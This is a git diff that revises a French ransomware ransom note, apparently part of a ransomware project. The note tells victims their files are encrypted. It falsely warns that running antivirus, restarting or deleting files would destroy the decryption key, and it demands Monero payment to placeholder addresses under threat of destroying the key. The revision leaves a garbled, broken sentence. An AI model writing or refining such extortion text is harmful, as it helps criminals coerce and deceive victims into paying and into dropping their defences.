@@ -1,36 +1,66 @@
 Oh non ! On vient de chiffrer toutes vos données.
 
-Que viens t-il de ce passer ?
+Que vient t-il de ce passer ?
 
-Vous venez d'étre infécté par ce que l'on appelle un ransomware. Tout vos fichiers
-sont chiffré, et nous sommes les seuls à avoir le mot de passe pour les dechiffrer.
-Bien sur, maintenant que tout vos fichiers sont chiffrés, vous ne pouvez plus rien faire,
-sinon vous detruirez votre clef de déchiffrement. De plus, nous vous recommandons
-de ne pas effectuer des actions telle que activer votre antivirus, redemarrer votre ordinateur
-ou supprimer des fichiers, car cela detruirais aussi votre clef de dechiffrement.
+Vous venez d'étre infécté par un ransomware. Tout vos fichiers sont chiffrés,
+et nous sommes les seuls à avoir la clé pour les déchiffrer. Nous vous recommandons
+de ne pas effetuer des actions telles que activer votre antivirus, redemarrer votre ordinateur
+ou supprimer des fichiers, car cela detruirait votre la clé.
+
 
 Est-ce que je peux récuperer mes fichiers ?
 
 Nous comprennons que vous voulez recuperer vos fichiers. Contrairement aux autres
-ransomwares, vous pouvez recuperer vos fichiers, et nous vous le garantissons,
-tant que vous faites ce que l'on veut. Si vous ne faites pas ce que l'on veut,
-vous ne pourrez pas recuperer votre program de déchiffrement, et bien sur, si
-vous ne payiez pas la rançon, la clef de dechiffrement sera détruite.
-Ce que l'on veux que vous fassiez c'est de tout simplement payer la rançon indiqué ci-dessous.
+ransomwares, vous pouvez les recuperer, et nous vous le garantissons.
+Pour ce faire, il vous suffit de suivre les instructions present dans la section "Comment je paye"
+
 
 Comment je peux recuperer mes fichiers ?
 
-Nous n'acceptons que le Monero. Pour faire en sorte de dechifrer vos fichiers, vous
-devez acheter du Monero, et nous faire un transfer a l'address indiqué aussi ci-dessous.
-Si vous avez besoin de plus d'information, vous pouvez aller ici : <https://www.getmonero.org/get-started/what-is-monero/>
+Nous n'acceptons que le Monero(BTC). Pour faire en sorte de recuperer vos fichiers, vous
+devez acheter du Monero, et nous faire un transfer a l'addresse(s) indiquée ci-dessous.
+    - ?
+    - ?
+    - ?
+Si vous avez besoin de plus d'informations, vous pouvez aller ici : <https://www.getmonero.org/get-started/what-is-monero/>
 et ici <https://www.binance.com/en/buy-Monero>. Nous devons recevoir un montant supérieur
-ou égal au montant de la rançon, ou sinon nous detruirons la clef de déchiffrement.
+ou égal au montant de la rançon, ou sinon nous détruirons la clef de déchiffrement.
+
 
 Comment je paye ?
 
-Quand vous avez complété le paiement, vous devez nous envoyer un message contenant les informations
-suivantes : le montant que vous nous avez envoyé; la date EXACT de l'envoie; l'ID du ransomware;
-une adresse e-mail valide. Si une des ces informations est manquante ou incorrecte, vous ne recevrez
-pas le program de déchiffrement, et la clef de déchiffrement sera détruite. Si tout est en ordre,
+Une fois que vous avez complété le paiement, vous devez nous envoyer un message contenant les informations
+suivantes : le montant que vous nous avez envoyé; la date exacte de l'envoi; l'ID du ransomware;
+une adresse e-mail valide.
+pas le programmze de déchiffrement, et la clef de déchiffrement sera détruite. Si tout est en ordre,
 nous vous enverrons un mail contenant le programme de déchiffrement.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
